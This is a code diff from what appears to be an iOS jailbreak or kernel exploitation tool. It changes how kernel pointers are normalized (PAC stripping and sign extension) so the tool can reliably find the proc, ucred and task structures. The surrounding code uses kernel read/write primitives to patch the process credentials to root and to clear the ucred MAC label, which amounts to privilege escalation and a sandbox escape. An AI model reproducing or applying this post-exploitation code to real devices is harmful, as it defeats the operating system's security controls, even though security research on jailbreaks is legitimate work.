@@ -147,14 +147,22 @@ void init_offsets(void) {
 static NSString *const kkernprocoffset = @"lara.kernprocoff";
 
 static bool is_kptr(uint64_t p) {
-    return (p & 0xffff000000000000ULL) == 0xffff000000000000ULL;
+    if ((p & 0x7ULL) != 0) return false;
+    return p >= 0xffffffe000000000ULL;
 }
 
 static inline uint64_t xpaci(uint64_t a);
 
 static inline uint64_t sign_kernel_ptr(uint64_t value) {
-    if ((value >> 32) > 0xFFFF) return value | 0xFFFFFF8000000000ULL;
+    if (is_kptr(value)) return value;
+    // arm64e pointers may be truncated; sign-extend only when high sign bits are present.
+    if (value & (1ULL << 55)) return value | 0xFF00000000000000ULL;
+    if (value & (1ULL << 47)) return value | 0xFFFF000000000000ULL;
     return value;
+}
+
+static inline uint64_t normalize_kernel_ptr(uint64_t raw) {
+    return sign_kernel_ptr(xpaci(raw));
 }
 
 static void kernel_logf(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
@@ -227,7 +235,7 @@ static uint32_t find_ucred_offset(uint64_t proc) {
 
 static uint64_t find_ucred_from_proc_ro(uint64_t proc) {
     uint64_t procRoRaw = ds_kread64(proc + PROC_PROC_RO_OFFSET);
-    uint64_t procRo = sign_kernel_ptr(xpaci(procRoRaw));
+    uint64_t procRo = normalize_kernel_ptr(procRoRaw);
     if (!is_kptr(procRo)) {
         kernel_logf("prepareIOKitAccess: proc_ro pointer invalid");
         return 0;
@@ -236,16 +244,16 @@ static uint64_t find_ucred_from_proc_ro(uint64_t proc) {
     for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
         uint64_t raw = ds_kread64(procRo + off);
         uint64_t candidates[3] = {
-            raw,
-            sign_kernel_ptr(xpaci(raw)),
-            sign_kernel_ptr(raw & 0xFFFFFFFFFFFFFFE0ULL)
+            normalize_kernel_ptr(raw),
+            normalize_kernel_ptr(raw & 0x00FFFFFFFFFFFFFFULL),
+            normalize_kernel_ptr(raw & 0xFFFFFFFFFFFFFFE0ULL)
         };
 
         for (size_t i = 0; i < 3; i++) {
             uint64_t cand = candidates[i];
             if (!is_kptr(cand)) continue;
 
-            uint64_t label = sign_kernel_ptr(xpaci(ds_kread64(cand + UCRED_CR_LABEL_OFFSET)));
+            uint64_t label = normalize_kernel_ptr(ds_kread64(cand + UCRED_CR_LABEL_OFFSET));
             if (!is_kptr(label)) continue;
 
             kernel_logf("prepareIOKitAccess: using proc_ro ucred pointer at +0x%x", off);
@@ -259,7 +267,7 @@ static uint64_t find_ucred_from_proc_ro(uint64_t proc) {
 
 static uint32_t find_task_offset(uint64_t proc) {
     uint64_t procsize = procsize_or_default();
-    uint64_t candidate = ds_kread64(proc + procsize);
+    uint64_t candidate = normalize_kernel_ptr(ds_kread64(proc + procsize));
     if (is_kptr(candidate)) {
         return (uint32_t)procsize;
     }
@@ -268,7 +276,7 @@ static uint32_t find_task_offset(uint64_t proc) {
     uint32_t end = (uint32_t)(procsize + 0x10);
 
     for (uint32_t off = start; off < end; off += 8) {
-        uint64_t value = ds_kread64(proc + off);
+        uint64_t value = normalize_kernel_ptr(ds_kread64(proc + off));
         if (is_kptr(value)) {
             return off;
         }
@@ -345,7 +353,7 @@ static int prepareIOKitAccess(void) {
     uint64_t ucred = 0;
     if (ucredOff) {
         kernel_logf("prepareIOKitAccess: ucred offset = 0x%x", ucredOff);
-        ucred = ds_kread64(self + ucredOff);
+        ucred = normalize_kernel_ptr(ds_kread64(self + ucredOff));
     } else {
         kernel_logf("prepareIOKitAccess: could not resolve ucred offset, trying proc_ro fallback");
     }
@@ -360,7 +368,7 @@ static int prepareIOKitAccess(void) {
     }
 
     uint32_t taskOff = find_task_offset(self);
-    uint64_t task = ds_kread64(self + taskOff);
+    uint64_t task = normalize_kernel_ptr(ds_kread64(self + taskOff));
     if (!is_kptr(task)) {
         kernel_logf("prepareIOKitAccess: invalid task pointer");
         return -1;
@@ -403,7 +411,7 @@ static int prepareIOKitAccess(void) {
 
     kernel_logf("prepareIOKitAccess: ucred uid/gid fields patched to root");
 
-    uint64_t crLabel = ds_kread64(ucred + 0x78);
+    uint64_t crLabel = normalize_kernel_ptr(ds_kread64(ucred + 0x78));
     if (crLabel) {
         ds_kwrite64(ucred + 0x78, 0);
         if (ds_kread64(ucred + 0x78) != 0) {
